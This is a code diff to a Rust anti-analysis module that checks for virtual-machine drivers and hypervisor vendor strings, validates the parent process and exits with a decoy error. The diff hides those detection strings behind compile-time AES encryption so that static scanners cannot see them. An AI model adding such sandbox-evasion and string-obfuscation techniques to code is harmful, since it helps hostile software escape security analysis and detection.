@@ -5,6 +5,8 @@
 //   - Decoy exit routine (plausible error message on self-terminate)
 //   - Parent process validation (allowlist check via NtQueryInformationProcess)
 
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 use std::fs;
 use std::path::Path;
 use std::thread;
@@ -19,19 +21,19 @@ pub fn is_virtualized() -> bool {
 
     if cfg!(target_os = "windows") {
         let artifacts = [
-            "C:\\Windows\\System32\\drivers\\virtio-net.sys",
-            "C:\\Windows\\System32\\drivers\\vioinput.sys",
-            "C:\\Windows\\System32\\drivers\\vioscsi.sys",
-            "C:\\Windows\\System32\\drivers\\vmmouse.sys",
+            aes_str!("C:\\Windows\\System32\\drivers\\virtio-net.sys"),
+            aes_str!("C:\\Windows\\System32\\drivers\\vioinput.sys"),
+            aes_str!("C:\\Windows\\System32\\drivers\\vioscsi.sys"),
+            aes_str!("C:\\Windows\\System32\\drivers\\vmmouse.sys"),
         ];
         for path in artifacts {
-            if Path::new(path).exists() { return true; }
+            if Path::new(&path).exists() { return true; }
         }
     } else if cfg!(target_os = "linux") {
-        for path in ["/sys/class/dmi/id/product_name", "/sys/class/dmi/id/sys_vendor"] {
+        for path in [aes_str!("/sys/class/dmi/id/product_name"), aes_str!("/sys/class/dmi/id/sys_vendor")] {
             if let Ok(content) = fs::read_to_string(path) {
                 let s = content.to_lowercase();
-                if s.contains("qemu") || s.contains("kvm") || s.contains("virtualbox") {
+                if s.contains(&aes_str!("qemu")) || s.contains(&aes_str!("kvm")) || s.contains(&aes_str!("virtualbox")) {
                     return true;
                 }
             }
@@ -116,6 +118,7 @@ pub fn is_bad_parent(valid_parents: &[String]) -> bool {
 
     // PROCESS_QUERY_LIMITED_INFORMATION works even when the parent runs at
     // higher integrity - no SeDebugPrivilege needed.
+    // OS-fixed (winnt.h), not mirrored by the typed FFI config.
     const PROCESS_QUERY_LIMITED_INFORMATION: u32 = 0x1000;
 
     unsafe {
